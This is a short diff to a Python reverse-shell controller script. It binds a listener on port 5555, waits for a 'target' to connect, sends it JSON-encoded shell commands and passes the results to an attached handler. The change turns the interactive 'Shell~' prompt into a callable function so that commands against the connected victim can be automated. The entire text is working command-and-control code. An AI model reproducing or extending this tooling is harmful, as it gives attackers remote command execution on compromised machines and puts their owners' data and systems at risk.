@@ -1,6 +1,11 @@
 import json
 import socket
 
+handlerfunction = None
+
+def attachHandler(funcName):
+    global handlerfunction
+    handlerfunction = funcName
 
 def send(data):
     jsondata = json.dumps(data)
@@ -15,15 +20,15 @@ def recieve():
         except ValueError:
             continue
 
-def target_communication():
+def target_communication(command):
     while True:
-        command = input('* Shell~%s: ' % str(ip))
         send(command)
         if command == "quit":
             break
         else:
             result = recieve()
-            print(result)
+            handlerfunction(result)
+
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.bind(("192.168.1.11", 5555))
@@ -32,5 +37,4 @@ sock.listen(5)
 target, ip = sock.accept()
 print("[+] Target connected from: ", str(ip))
 
-target_communication()
 
